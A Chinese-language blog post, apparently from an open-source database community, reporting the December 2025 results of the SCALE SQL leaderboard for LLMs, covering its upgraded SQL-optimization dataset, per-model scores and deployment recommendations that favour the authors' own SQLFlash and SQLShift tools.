            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1480387593251847/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱可生开源社区
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:52:54.000Z" title="Tue Jan 06 2026 06:52:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">文章大纲</h2>
<ol>
<li>本月榜单导览</li>
<li>测评基准升级</li>
<li>新增的主流模型技术解析与对比</li>
<li>评测模型升级更新</li>
<li>三大核心维度综合榜单</li>
<li>结论与推荐部署矩阵</li>
<li>专家点评</li>
</ol>
<h2 data-id="heading-1">一、本月榜单导览</h2>
<p>2025 年 12 月，<a href="https://link.juejin.cn?target=https%3A%2F%2Fsql-llm-leaderboard.com%2Franking%2F2025-12" title="https://sql-llm-leaderboard.com/ranking/2025-12" target="_blank" ref="nofollow noopener noreferrer">SCALE</a> 完成了核心数据集和榜单模型的迭代。本月更新的核心价值在于：<strong>SQL 调优维度测评数据集 2.0 正式上线</strong>。该版本标志着评测基准从学术化 SQL 调优，全面转向对“<strong>生产级复杂性</strong>”场景的真实模拟。</p>
<p>与此同时，本月完成了针对 <em>GPT-5 系列</em>、<em>Claude 4.5 系列</em> 及 <em>蚂蚁百灵 Ling-2.0-Flash</em> 等新一代模型的首发评测。我们旨在通过严苛的基准数据集，为企业技术决策者提供模型 SQL 能力具备落地价值的参考。</p>
<h2 data-id="heading-2">二、测评基准升级</h2>
<p>为系统化评估大语言模型（LLM）在真实生产环境复杂业务逻辑处理中的实战能力，本次我们对 SQL 优化维度的评测数据集进行了大幅度的体量扩充和难度升级。</p>
<p><strong>需要特别说明的是，由于新版测试用例在 SQL 复杂度和业务场景覆盖上均显著提升，本次测评中各模型与基线应用的整体得分相较此前出现了一定程度的回落。</strong></p>
<p>其中 <em>DeepSeek V3.1</em>、<em>Kimi-K2</em> 和 <em>DeepSeek R1</em> 的得分降幅相对明显，较上一期分别下降了 22.7、18.0 和 14.1 分。这一现象客观反映了复杂业务 SQL 对模型的优化能力提出了远高于常规语法改写的挑战。</p>
<p>以下将详细介绍本次数据集升级的核心特征及各模型的具体表现。</p>
<h3 data-id="heading-3">SQL 层面的核心设计特征</h3>
<p>新版数据集摒弃了理想化的语法改写，覆盖 MySQL、Oracle、Postgres 与 SQL Server 多种方言，聚焦于解决生产环境中的真实性能瓶颈：</p>
<ul>
<li><strong>丰富的语法覆盖</strong>：包含 CTE、嵌套子查询、窗口函数、聚合、复杂表达式与多种内置函数，能够考察模型对复杂 SQL 语义的理解与改写能力。</li>
<li><strong>接近真实业务的复杂查询</strong>：多表 JOIN、长链式子查询与多层嵌套、混合聚合与过滤等写法模拟生产场景，能暴露模型在实际工程中遇到的难点。</li>
<li><strong>方言与索引敏感写法并存</strong>：同时包含 MySQL/Oracle/Postgres/SQL Server 的方言特性与易让索引失效的写法（隐式类型转换、LIKE、字符串/时间处理），用于检测模型的方言适配与索引意识。</li>
<li><strong>明确且可判定的优化目标</strong>：每条 SQL 都有对应的“期望触发规则”（如谓词下推、投影下推、LEFT→INNER、子查询扁平化等），便于判定模型输出是否实现了具体且可验证的改写。</li>
<li><strong>强调语义等价与可执行性</strong>：要求优化保持语义等价和语法正确，既检验模型的改写能力，也保证输出在实际数据库上具有可验证性。</li>
</ul>
<h3 data-id="heading-4">涵盖的典型优化规则</h3>
<p>数据集里的规则以“<strong>可被模型发现并通过改写实现的语义等价优化</strong>”为主，其中常见但不限于包括以下规则族：</p>
<ul>
<li><strong>投影下推 / 删除冗余投影</strong>（Projection pushdown）
<ul>
<li>说明：移除子查询返回但外层未使用的列，或在更内层就只保留外层需要的列，减少 IO 和网络传输。</li>
<li>示例场景：多层嵌套子查询中，内层 gender 列没有被外层使用，应该移除。</li>
</ul>
</li>
<li><strong>谓词下推</strong>（包括将外层 WHERE 下推到内层）<strong>与 LIKE 前缀改写为范围查询</strong>
<ul>
<li>说明：把过滤条件尽早在数据源处执行；对 <code>LIKE 'prefix%'</code> 的前缀匹配可改写为范围比较（<code>col &gt;= 'prefix' AND col &lt; 'prefix{next_char}'</code>）以利用索引。</li>
<li>示例场景：外层 <code>WHERE teacher_name LIKE 'Dr.%'</code> 可以下推并改写成范围条件以走索引。</li>
</ul>
</li>
<li><strong>子查询折叠 / 子查询扁平化</strong>（subquery folding / flattening）
<ul>
<li>说明：将不必要的嵌套子查询合并到一个查询块，减少临时中间结果。</li>
<li>示例场景：多个层级的 SELECT/ FROM 包装可以合并，消除中间表别名产生的冗余。</li>
</ul>
</li>
<li><strong>无输出 JOIN 转 EXISTS / LEFT JOIN 转 INNER JOIN</strong>
<ul>
<li>说明：当外连接实际不会产生 NULL 扩展或存在等价约束时，用更高效的 JOIN/EXISTS 语义替换，或者消除没有输出贡献的表。</li>
<li>示例场景：子查询语义保证某一列有值，则 <code>LEFT JOIN</code> 可安全变为 <code>INNER JOIN</code>。</li>
</ul>
</li>
<li><strong>消除隐式类型转换 / 时间条件优化</strong>
<ul>
<li>说明：避免字符串与日期/时间之间的隐式转换，改用一致的类型或显式函数以避免索引失效。</li>
<li>示例场景：日期字符串比较应改为使用标准时间戳或使用 <code>TO_DATE</code> 后与索引列比较。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">SQL 优化分项指标表现</h3>
<p>基于强化后的数据集，我们通过逻辑等价性、语法正确性、优化深度三个核心技术子维度评估模型在数据升级后的真实表现：</p>
<h4 data-id="heading-6">逻辑等价</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03531473d1a14220a143f790c93d127f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=PUG8veuET%2FwHUFoIMHVVYSjJP8o%3D" alt="SQL 优化 - 逻辑等价" loading="lazy"/></p>
<p><strong>数据解读</strong>：在长文本和复杂业务SQL场景下，<a href="https://link.juejin.cn?target=https%3A%2F%2Fsqlflash.ai%2F" title="https://sqlflash.ai/" target="_blank" ref="nofollow noopener noreferrer">SQLFlash</a> 以 82.5 的高分确立了基线优势，展现了极高的稳定性。在对话类模型中，<em>DeepSeek-R1（70.1）</em> 与 <em>Gemini 3 Pro（68.0）</em> 表现接近，位居前列。</p>
<p><strong>评价</strong>：这一维度考察的是“<strong>改写后 SQL 是否与原始 SQL 逻辑一致</strong>”。<em>DeepSeek-R1</em> 在处理复杂逻辑嵌套和函数时表现出优于 <em>GPT-5</em> 的逻辑收敛性，证明了其推理模型架构在保证业务逻辑不偏离方面的优势。</p>
<h4 data-id="heading-7">优化深度</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/819b298d595847da8a075481492744e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=huAI8D7ni6%2BfK9yc21fv3CzZPJ0%3D" alt="SQL 优化 - 优化深度" loading="lazy"/></p>
<p><strong>数据解读</strong>：这是难度最高的维度。<em>SQLFlash（57.5）</em> 依然领跑。值得注意的是，<em>OpenAI o4-mini-high（53.3）</em> 和 <em>GPT-5（52.1）</em> 紧随其后，反超了其他竞争对手 。</p>
<p><strong>评价</strong>：该维度衡量模型是否具备 DBA 级别的物理代价评估能力。OpenAI 系列模型在此展现了其“物理执行计划专家”的特质，能够主动识别索引失效等底层痛点并进行深层重构。</p>
<h4 data-id="heading-8">语法错误检测</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a720a79e94b45bda760f1acb5bee075~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=8DMwdLfYq%2F5fL3E6TGIy9Oi%2BeDk%3D" alt="SQL 优化 - 语法错误检测" loading="lazy"/></p>
<p><strong>数据解读</strong>：<em>OpenAI o4-mini-high</em> 以 90.7 的相对高分位居榜首，<em>GPT-5.2（88.7）</em> 和 <em>SQLFlash（87.6）</em> 紧随其后。</p>
<p><strong>评价</strong>：在代码合规性和语法安全性方面，OpenAI 阵营展现了统治力。这表明在构建自动化 SQL 代码校验工具时，<em>o4-mini-high</em> 是当前最具性价比的选择。</p>
<h4 data-id="heading-9">SQL 优化维度测评总结</h4>
<p>本次测评基于更贴近真实生产环境的数据集展开，测试用例在 SQL 复杂度和业务场景覆盖上均有所提升。在这一背景下，各模型与基线应用的整体得分相较此前出现一定回落，反映出复杂业务 SQL 对模型优化能力提出了更高要求。</p>
<p>与此同时，<em>SQLFlash</em> 作为专注于 SQL 优化的专业应用，在综合表现上仍保持领先优势。当前主流模型在 SQL 优化维度各项指标上的具体表现如下图所示：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09b46af87cbe4ad99a1877e31b628369~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=pBS%2BLNhgvr%2FCd5ZhFFF0nohUNKg%3D" alt="SQL 优化指标对比" loading="lazy"/></p>
<h2 data-id="heading-10">三、新增的主流模型技术解析与对比</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb391afd1d5f49c6aae648646ffd4c00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=NHWM1R9wXso%2BuoPcuT5eYIiVVWo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">OpenAI</h3>
<p><strong>GPT-5.2：高精度语法纠错与执行专家</strong></p>
<ul>
<li><strong>能力核心</strong>： SQL 理解（81.3）能力稳居第一梯队。其最大的亮点在于 <strong>语法错误检测</strong>（优化维度 88.7 / 理解维度 82.9），是所有模型中对语法最敏感的。同时在国产数据库支持上也表现不俗（86.8）。</li>
<li><strong>业务价值</strong>：极佳的 SQL 调试助手和代码质量守门员。在开发阶段集成该模型，可以有效拦截绝大多数语法错误，提升代码上线质量；同时保证了较高的执行准确性。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88b35101ab484d3490483168e96ef4e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=PP62dFh924bxFX7VpN90DBEeNmE%3D" alt="GPT-5.2 能力维度评分" loading="lazy"/></p>
<p><strong>GPT-5.1：国产数据库适配领航者</strong></p>
<ul>
<li><strong>能力核心</strong>： 在 <strong>国产数据库（94.7）</strong> 这一细分指标上取得了全场最高分（与 QwQ 并列）。虽然在优化深度和大 SQL 转换上稍弱，但在特定环境下的适应性极强。</li>
<li><strong>业务价值</strong>：针对本土化业务场景，尤其是信创环境下的数据库迁移和应用开发具有极高的可用性，能准确处理国产数据库特有的语法特性。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f3eecf2d29947699c7e26a9aac37cdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=kKo7V4fUm0Q%2FcNZIFU%2Bw0luYzV8%3D" alt="GPT-5.1 能力维度评分" loading="lazy"/></p>
<h3 data-id="heading-12">Anthropic</h3>
<p><strong>Claude Opus 4.5：全能型 SQL 架构师（理解与优化双料冠军）</strong></p>
<ul>
<li><strong>能力核心</strong>：该模型在 <strong>SQL 理解（83.5）</strong> 和 <strong>SQL 优化 （60.4）</strong> 两个最关键的维度均取得了全场最高分。它在执行计划检测（87.1） 和逻辑等价性（61.9）方面表现出极高的稳定性。</li>
<li><strong>业务价值</strong>：适用于对准确性要求极高的核心业务场景，如复杂查询的深度调优、自动化运维诊断以及作为 SQL 审核的高级专家系统，能够显著降低数据库性能风险。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54d3f932a2334bb299a8786fe25b922c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=XJ7c7PQjzhxWTcCaBWgDiRwxS%2BQ%3D" alt="Claude Opus 4.5 能力维度评分" loading="lazy"/></p>
<p><strong>Claude Sonnet 4.5：复杂 SQL 迁移与重构专家</strong></p>
<ul>
<li>
<p><strong>能力核心</strong>：综合能力极强，并在 <strong>方言转换（72.2）</strong> 维度表现出色。特别是 <strong>大 SQL 转换（71.0）</strong> 分数远超其他模型（其他多在 40 分以下），展现了惊人的长文本和复杂逻辑处理能力。同时在 SQL 优化方面与 Opus 并列第一。</p>
</li>
<li>
<p><strong>业务价值</strong>：是传统数据库向云原生数据库迁移、或异构数据库迁移的最佳选择，尤其擅长处理遗留系统中的超长复杂存储过程和查询语句，大幅降低人工重构成本。</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7249a6a4899849f9bbc1b68e0c819b57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=qE%2F5rhoeECdtu6K9D5H1ahfszPc%3D" alt="Claude Sonnet 4.5 能力维度评分" loading="lazy"/></p>
<p><strong>Claude Haiku 4.5：高效异构方言转换器</strong></p>
<ul>
<li>能力核心：以 73.3 的高分拿下了 方言转换 维度的全场第一。虽然在 SQL 理解深度上略逊于 Opus 和 Sonnet，但在处理不同数据库语法差异（尤其是逻辑等价性高达 90.3）方面表现极其敏锐。</li>
<li>业务价值： 适合高频、大批量的多数据库适配任务，如多云环境下的 SQL 兼容性转换工具，能够快速、低成本地实现跨平台 SQL 语法的自动化翻译。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e278fddaf1842c2b682ce73aaf1bd3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=INn7no%2F17GJGCjaSjEnHdnVt4KU%3D" alt="Claude Haiku 4.5 能力维度评分" loading="lazy"/></p>
<h3 data-id="heading-13">蚂蚁百灵</h3>
<p><strong>Ling-2.0-Flash：基础 SQL 辅助工具</strong></p>
<ul>
<li>
<p><strong>能力核心</strong>：各项指标表现相对平缓，方言转换能力 (43.5) 较弱，但在国产数据库支持 (84.2) 和基础语法检测 (80.4) 上仍有一战之力。</p>
</li>
<li>
<p><strong>业务价值</strong>：适用于轻量级应用场景或作为辅助性的备选模型，用于处理简单的 SQL 校验和基础国产库适配任务。</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aead79c6f8034a8aaa522fc1111005f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=m9w2IRGEdP3v705UtPq3r8%2F%2FA84%3D" alt="Ling-2.0-Flash 能力维度评分" loading="lazy"/></p>
<h3 data-id="heading-14">千问</h3>
<p><strong>QwQ-32B：高性价比国产化集成方案</strong></p>
<ul>
<li>
<p><strong>能力核心</strong>：同样在 国产数据库 (94.7) 指标上表现卓越。虽然在 SQL 优化 (51.3) 和复杂转换上相对较弱，但在基础的 SQL 理解 (75.6) 和语法检测 (78.6) 上保持了可用的基准水平。</p>
</li>
<li>
<p><strong>业务价值</strong>：作为参数量相对较小的模型，它是私有化部署和国产化替代的高性价比选择，特别适合处理涉及国产数据库的基础查询和交互任务。</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70160b916e1143f89711d94d0a751daa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=5BZhABckvN%2BwyFs8Gl2SOC7Fjwg%3D" alt="QwQ-32B 能力维度评分" loading="lazy"/></p>
<h2 data-id="heading-15">四、评测模型升级更新</h2>
<h3 data-id="heading-16">新增评测模型</h3>
<ul>
<li><strong>Claude 4.5 系列</strong>：Opus、Sonnet、Haiku 全量进入评测矩阵。</li>
<li><strong>OpenAI 系列</strong>：GPT-5.1、GPT-5.2 快照稳定版本。</li>
<li><strong>蚂蚁百灵系列</strong>：Ling-2.0-Flash。</li>
<li><strong>千问系列</strong>：QWQ-32B。</li>
</ul>
<h3 data-id="heading-17">存量模型升级与快照更新</h3>
<ul>
<li><strong>o4-mini-high</strong>：替换旧版版本，显著提升了多表关联场景下的逻辑收敛性。</li>
<li><strong>GPT-5 统一快照</strong>：将所有实验分支统一更新为最新的 Snapshot 版本，确保后期评测的一致性。</li>
<li><strong>DeepSeek-V3.2 正式版</strong>：由实验版 (Exp) 切换至稳定版，重点针对 Oracle 语法下的幻觉问题进行了针对性修复。</li>
</ul>
<h2 data-id="heading-18">五、三大核心维度综合榜单</h2>
<p>基于 <strong>SQL 优化数据集 2.0 评测标准</strong>，本月模型在各维度的性能排布如下：</p>
<h3 data-id="heading-19">SQL 优化能力榜</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48f110f8dcae45bd886aefdd042e2b17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=sEMwNfMNd%2FaWOdLAj2S2ZTcio%2Bs%3D" alt="SQL 优化" loading="lazy"/></p>
<p><strong>榜单点评</strong>：<em>SQLFlash（72.6）</em> 作为垂直领域基线模型继续霸榜。在通用大模型中，<em>GPT-5（65.1）</em> 凭借其在优化深度上的积累位居第一，<em>Gemini 3 Pro（64.4）</em> 紧随其后。这表明在处理高性能需求时，<em>GPT-5</em> 仍是通用模型中的最优解 。</p>
<h3 data-id="heading-20">SQL 方言转换榜</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e91ce803047c49778e9f2f460e5018fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=KYRDsJZGY2ajH5EPljzm3JQZaM4%3D" alt="SQL 方言转换" loading="lazy"/></p>
<p><strong>榜单点评</strong>：<em>SQLShift（83.4）</em> 展现了专有模型的优势。通用模型方面，<em>Gemini 3 Pro（77.1）</em> 与 <em>Gemini 2.5 Pro（77.1）</em> 并列第二，显示了 Google 模型在跨平台语言理解上的深厚功底，尤其是在异构数据库迁移场景下表现稳健。</p>
<h3 data-id="heading-21">SQL 理解能力榜</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0c71cfc24014e0397da13a24a1baa95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=UReAtVyZCbByQN1JP%2FzC85HMSTU%3D" alt="SQL 理解能力" loading="lazy"/></p>
<p><strong>榜单点评</strong>：<em>Gemini 3 Pro（86.0）</em> 在此维度表现卓越，超越了 <em>Claude Opus 4.5（83.5）</em>。这意味着在代码审查和执行计划分析任务中，<em>Gemini 3 Pro</em> 拥有最强的上下文理解与潜在风险识别能力。</p>
<h2 data-id="heading-22">六、 结论与推荐部署矩阵</h2>
<p>根据 <strong>SQL 优化数据集 2.0</strong> 的实战评测得分，我们建议用户按需选择部署方案：</p>
<ul>
<li><strong>生产环境慢 SQL 性能调优</strong>：首选 <em>SQLFlash</em> 专业的SQL调优应用， 模型可选 <em>GPT-5.2</em>，利用其在物理层执行路径的深度优化能力。</li>
<li><strong>高保真 SQL 重写/规整</strong>：首选 <em>SQLFlash</em>，确保改写后业务逻辑零偏差，适合核心交易链路代码规整。</li>
<li><strong>复杂业务逻辑迁移和国产化信创支持</strong>：首选 <a href="https://link.juejin.cn?target=https%3A%2F%2Fsqlshift.cn%2F" title="https://sqlshift.cn/" target="_blank" ref="nofollow noopener noreferrer">SQLShift</a> 专业的 SQL 方言转换应用，模型可选 <em>Claude Opus 4.5</em>，确保在跨库迁移中的极致逻辑一致性。</li>
<li><strong>高频实时 SQL 审计与校验</strong>：首选 <em>Claude Haiku 4.5</em> 或 <em>Ling-2.0-Flash</em>，在极低时延下提供高可靠的语法诊断。</li>
</ul>
<h2 data-id="heading-23">七、专家点评</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77ef6abef15a4b578f1359d8de4a8fca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5Y-v55Sf5byA5rqQ56S-5Yy6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287173&amp;x-signature=ERhS9TU3%2FGlw9a1bC7iJudxUtgo%3D" alt="" loading="lazy"/></p>
<blockquote>
<p><strong>吴炳锡</strong>，Databend Labs 联合创始人， 腾讯 TVP 成员， 中国数据库大会顾问团成员。</p>
</blockquote>
<p><strong>点评内容：</strong></p>
<p><em>SCALE 是可以让每个人轻松的关注大模型的 SQL 排行榜。SCALE 站在开源角度公开测试的数据和脚本，持续对比，每个月一更新用于展示每个大模型在 SQL 领域的真实水平。同时 SCALE 保持社区共建，测试及过程公开，鼓励提交测试用例，鼓励团队一同参与。</em></p>
<p><em><strong>整体来讲 SCALE 对于 DBA 或是开发人员快速了解大模型在 SQL 方面的能力用于 SQL 性能方面的优化，同时对于模型团队，也可以快速的了解模型在 SQL 方面的短板，利于后期的优化。</strong></em></p>
<p><em>目前来看 SCALE 的 SQL 能力还是主要以 MySQL 类的 SQL 为主，希望后期也引入分析类湖仓产品，如 Databend , 可以支持更复杂的 SQL，也可以进一步看看大模型的能力。最后建议从月更到周更，大模型行业进化太快，感觉周更可以更好的看到模型的进展。</em></p>
<blockquote>
<p>查看完整榜单并联系我们提交您的产品进行测评。<a href="https://link.juejin.cn?target=https%3A%2F%2Fsql-llm-leaderboard.com%2F" target="_blank" title="https://sql-llm-leaderboard.com/" ref="nofollow noopener noreferrer">sql-llm-leaderboard.com/</a></p>
</blockquote>
<p><strong>SCALE：为专业 SQL 任务，选专业 AI 模型。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[第7章 Prisma入门]]></title>    <link>https://juejin.cn/post/7592119218025250851</link>    <guid>https://juejin.cn/post/7592119218025250851</guid>    <pubDate>2026-01-06T06:56:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" 